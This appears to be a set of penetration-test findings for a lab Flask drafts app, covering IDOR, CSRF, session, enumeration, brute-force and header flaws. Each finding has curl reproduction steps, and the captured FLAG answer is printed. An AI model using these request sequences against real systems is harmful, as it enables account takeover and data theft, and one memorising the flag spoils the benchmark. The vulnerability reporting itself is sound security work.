title: IDOR read: /edit_draft/<id> lets any user read any other user's drafts (incl. admin draft with secret)
description: The GET /edit_draft/<id> endpoint only requires an authenticated session and performs no ownership check. Draft IDs are sequential integers. Authenticated user bobZ9 can read aliceX7's draft (id=2) and the admin user's draft (id=1), whose content contained sensitive data (a FLAG{...} string), simply by changing the id in the URL.
steps:
1. Register/login as any user (bobZ9/Passw0rd!b) to get session cookie.
2. curl -s -H 'Cookie: session=<bob_token>' http://xben-090:5003/edit_draft/1
3. Response 200 OK renders admin's draft: title value="admin_draft", textarea content FLAG{c34546c435159be605fd29f73745d42be5659ed99e023bee7dbd97035a17426a}.
4. Repeat with /edit_draft/2 to read aliceX7's draft.
evidence: GET /edit_draft/1 as bobZ9 -> 200, body contains textarea 'FLAG{c34546c435159be605fd29f73745d42be5659ed99e023bee7dbd97035a17426a}'; GET /edit_draft/2 -> 200 with aliceX7's draft content.

title: IDOR write: POST /edit_draft/<id> lets any user modify or overwrite any other user's draft
description: The POST /edit_draft/<id> endpoint applies no ownership check. bobZ9 overwrote the title and content of aliceX7's draft id=2 (observed by aliceX7 as title 'PWNED_BY_BOB'; reverted afterwards). The admin draft id=1 can be overwritten the same way.
steps:
1. As bobZ9: curl -s -D - -H 'Cookie: session=<bob_token>' -X POST http://xben-090:5003/edit_draft/2 --data-urlencode 'title=PWNED_BY_BOB' --data-urlencode 'content=idor write test' --data-urlencode 'submit=Save Draft' -> 302 FOUND.
2. As aliceX7: GET /edit_draft/2 -> title field value="PWNED_BY_BOB" confirms the foreign object was modified.
3. Same POST works against /edit_draft/1 (admin's draft) - returns 302 and saves.
evidence: bob POST /edit_draft/2 -> 302; alice GET /edit_draft/2 shows title 'PWNED_BY_BOB'. bob POST /edit_draft/1 -> 302 (admin draft writable).

title: Broken object-level authorization on /<username>/drafts: any user can list any other user's drafts
description: GET /<username>/drafts is only checked for being logged in; the <username> path parameter is never matched against the session identity. As bobZ9, requesting /aliceX7/drafts returns aliceX7's draft titles plus /edit_draft/<id> links, and /admin/drafts returns the admin user's draft (id=1, 'admin_draft').
steps:
1. Login as bobZ9.
2. curl -s -H 'Cookie: session=<bob_token>' http://xben-090:5003/aliceX7/drafts -> 200, heading "aliceX7's Drafts" listing 'Alice' with href=/edit_draft/2.
3. curl -s -H 'Cookie: session=<bob_token>' http://xben-090:5003/admin/drafts -> 200, heading "admin's Drafts" with href=/edit_draft/1.
evidence: bobZ9 GET /admin/drafts -> 200 'admin's Drafts' + edit_draft/1 link; bobZ9 GET /aliceX7/drafts -> 200 lists alice's draft id 2.

title: Logout does not invalidate the session token; static Flask-Login _id and no expiry make stolen cookies permanently usable
description: /logout only instructs the browser to delete the cookie (Set-Cookie session=; Max-Age=0); the previously issued signed token keeps authenticating (still 200 on protected pages after logout). The session payload also contains no per-login nonce: every login of a user produces the identical claims {'_fresh':true,'_id':'7ab7039c...','_user_id':'X'} (only the itsdangerous timestamp part changes), _id being one constant shared by ALL users/sessions (alice, weakTestQ, roleTest1 all show the same _id). There is no server-side revocation or expiry, so any captured token is a permanent credential even after the user logs out or re-logs in.
steps:
1. Login as aliceX7 -> token T.
2. GET /logout -> 302 with Set-Cookie session= (deleted).
3. curl -H 'Cookie: session=T' http://xben-090:5003/aliceX7/drafts -> still 200 OK (logout did not revoke T).
4. Login again -> zlib-decode new cookie: identical claims, same _id '7ab7039c2c4c7410...' as the token from step 1; _id equals the one found in every other user's session.
evidence: Token issued 15:18 UTC worked at 15:40+ after /logout; _id identical across aliceX7(id3), weakTestQ(id5), roleTest1(id6) sessions.

title: Username enumeration through registration error message
description: POST /register with an existing username returns a distinct flash message 'Username already exists. Please choose a different one.' while unknown usernames register successfully (302). This lets an attacker enumerate valid accounts (e.g. confirm 'admin' exists).
steps:
1. curl -s -X POST http://xben-090:5003/register --data-urlencode 'username=aliceX7' --data-urlencode 'password=Zzz12345!' --data-urlencode 'confirm_password=Zzz12345!'
2. Response 200 contains 'Username already exists. Please choose a different one.'
3. Any unused username returns 302 'Registration successful' - differential response identifies valid users.
evidence: Register existing 'aliceX7' -> 200 + 'Username already exists...'; fresh name -> 302 registration successful.

title: Account existence oracle on /<username>/drafts (200 vs 404) for authenticated users
description: GET /<username>/drafts returns 200 for every existing account (aliceX7, bobZ9, admin, weakTestQ, roleTest1...) and 404 for non-existing usernames, letting any logged-in user enumerate all registered accounts, including 'admin'.
steps:
1. Login as bobZ9.
2. curl -s -o /dev/null -w '%{http_code}' -H 'Cookie: session=<bob_token>' http://xben-090:5003/admin/drafts -> 200.
3. Same request for /nosuchuserZ99/drafts -> 404 (207 bytes standard 404 page).

title: No password policy: single-character passwords accepted at registration
description: POST /register accepts a 1-character password ('1') and no complexity rules; account weakTestQ was created and logs in with password '1'. Combined with the missing rate limiting this enables credential guessing against arbitrary accounts.
steps:
1. curl -s -D - -X POST http://xben-090:5003/register --data-urlencode 'username=weakTestQ' --data-urlencode 'password=1' --data-urlencode 'confirm_password=1' -> 302 'Registration successful'.
2. POST /login username=weakTestQ password=1 -> 302 + session cookie (_user_id 5).
evidence: Account with password '1' created and successfully authenticated (session payload {'_user_id':'5'}).

title: Missing brute-force protection / rate limiting on POST /login
description: 20 consecutive wrong-password attempts against the 'admin' account completed in 2 seconds, all answered with the normal 200 'Invalid username or password' page; no lockout, delay, captcha or IP throttling. X-Forwarded-For handling was irrelevant because no limit exists at all.
steps:
1. for i in $(seq 1 20); do curl -s -o /dev/null -w '%{http_code} ' -X POST http://xben-090:5003/login --data-urlencode 'username=admin' --data-urlencode "password=wrong$i" -d 'submit=Login'; done
2. All 20 responses are HTTP 200 in ~2s; subsequent attempts (also with X-Forwarded-For: 1.2.3.4) are unaffected.

title: Cross-Site Request Forgery on POST /edit_draft/<id> (no CSRF token, no Origin/Referer validation)
description: State-changing draft edit forms contain no anti-CSRF token (only title/content/submit) and the server accepts requests carrying foreign Origin headers, so any website can silently modify a logged-in victim's (or admin's) drafts.
steps:
1. Verify form: GET /edit_draft/4 as bobZ9 -> no csrf/token fields.
2. Simulate cross-site request: curl -s -D - -o /dev/null -H 'Cookie: session=<bob_token>' -H 'Origin: http://evil.example' -X POST http://xben-090:5003/edit_draft/4 --data-urlencode 'title=CSRF_proof' --data-urlencode 'content=proof' -> HTTP/1.1 302 FOUND (change applied).
3. Same absence of protection on POST /create_draft.
evidence: Cross-origin POST with attacker Origin header returned 302 and modified draft; forms carry no token.

title: Cross-Site Request Forgery on POST /login (login CSRF, no token)
description: The login form has no anti-CSRF token and the endpoint performs no Origin/Referer check, allowing an attacker to force a victim's browser to log in to an attacker-controlled account - confirmed by a 302 login response from a foreign-Origin request.
steps:
1. curl -s -D - -o /dev/null -H 'Origin: http://evil.example' -X POST http://xben-090:5003/login --data-urlencode 'username=bobZ9' --data-urlencode 'password=Passw0rd!b' -d 'submit=Login' -> 302 FOUND + Set-Cookie session (login succeeded cross-origin).
2. Login page HTML contains no token field.
evidence: Foreign-Origin POST /login -> 302 to /bobZ9/drafts with new session cookie.

title: Missing security headers on all responses (CSP, X-Frame-Options, X-Content-Type-Options, Referrer-Policy, HSTS)
description: Responses only contain Server/Date/Content-Type/Content-Length/Vary/Cookie headers: no Content-Security-Policy, no X-Frame-Options or frame-ancestors (clickjacking of draft-editing pages possible), no X-Content-Type-Options, no Referrer-Policy, no Strict-Transport-Security.
steps:
1. curl -s -D - -o /dev/null http://xben-090:5003/
2. Inspect headers: none of the listed security headers present on login/dashboard/draft pages.
evidence: Header dumps in artifacts/root_001.txt etc.: no CSP/XFO/XCTO/Referrer-Policy/HSTS.

title: Session cookie issued without Secure and SameSite attributes
description: Set-Cookie: session=...; HttpOnly; Path=/ - the HttpOnly flag is set but SameSite is absent (legacy browsers send the cookie cross-site, enabling the CSRF findings) and Secure is absent, so the long-lived session token can traverse cleartext HTTP.
steps:
1. curl -s -D - -o /dev/null -X POST http://xben-090:5003/login --data-urlencode 'username=bobZ9' --data-urlencode 'password=Passw0rd!b' -d 'submit=Login'
2. Set-Cookie header contains only HttpOnly; Path=/ - no Secure, no SameSite.

title: Server banner discloses framework and versions (Werkzeug/3.0.6 Python/3.8.20)
description: Every response exposes 'Server: Werkzeug/3.0.6 Python/3.8.20', telling attackers the stack (Flask/Werkzeug versions) for targeted exploit research; Werkzeug 3.0.6 itself is current but Python 3.8.20 is an EOL-era interpreter.
steps:
1. curl -s -D - -o /dev/null http://xben-090:5003/
2. Header: Server: Werkzeug/3.0.6 Python/3.8.20.
evidence: Server header present on every response (artifacts/root_001.txt).

title: Unprotected state-changing GET /logout allows cross-site forced logout (CSRF by design)
description: /logout is a GET request that deletes the victim's session with no token or referer validation; any page can embed and forcibly log out every logged-in visitor (session termination CSRF).
steps:
1. curl -s -D - -H "Cookie: session=<alice_token>" -H 'Referer: http://evil.example/x' http://xben-090:5003/logout
2. Response 302 + Set-Cookie: session=; Max-Age=0 (session terminated for that visitor).
evidence: Cross-referer GET /logout returned 302 and expired the session cookie.

title: No size limit on draft 'content' field (unbounded storage writes, title is capped but content is not)
description: POST /create_draft and POST /edit_draft/<id> enforce a 100-char cap on 'title' (300 chars -> validation error 200) but accept arbitrarily large 'content' - a 60 KB payload was stored verbatim; repeated requests could bloat storage (allocation without limits). Same missing bound on /create_draft.
steps:
1. As bobZ9: curl -s -D - -o /dev/null -H 'Cookie: session=<tok>' -X POST http://xben-090:5003/edit_draft/4 --data-urlencode 'title=CSRF_proof' --data-urlencode 'content=<60000 x chars>' --data-urlencode 'submit=Save Draft' -> 302; GET /edit_draft/4 shows 60000-char content stored.
2. Same behavior on POST /create_draft (50 KB accepted).
evidence: 60,000-char content saved and returned; title>100 rejected proving the check exists but omits content.

title: Unhandled exception (HTTP 500) on GET /edit_draft/<id> for ids >= 2^63 - integer overflow with no error handling
description: The id path converter accepts arbitrarily large integers; values that exceed the 64-bit range (e.g. 99999999999999999999 or 9223372036854775808) are passed to the database query and raise an unhandled exception, returning HTTP 500 with a generic Werkzeug error page instead of a validation error. Same behavior exists on POST /edit_draft/<id>. No stack trace leaks, but the crash demonstrates absent input bounds and can be triggered by any authenticated user.
steps:
1. curl -s -o /dev/null -w '%{http_code}' -H 'Cookie: session=<any_user_token>' http://xben-090:5003/edit_draft/9223372036854775808 -> 500
2. http://xben-090:5003/edit_draft/2147483648 -> 404 (normal), showing only >2^63 range errors out
3. Response body: '500 INTERNAL SERVER ERROR' Werkzeug page (no debug traceback).
